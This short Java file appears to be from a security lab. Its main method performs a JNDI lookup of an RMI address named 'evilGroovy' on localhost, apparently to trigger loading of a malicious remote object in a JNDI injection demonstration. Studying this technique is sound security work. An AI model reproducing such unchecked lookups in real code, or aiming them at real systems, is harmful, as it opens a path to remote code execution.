package com.dahe.hello.controller.JNDI;

import javax.naming.InitialContext;


public class jndiTest {
    public static void main(String[] args) throws Exception {
        String string = "rmi://localhost:1097/evilGroovy";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
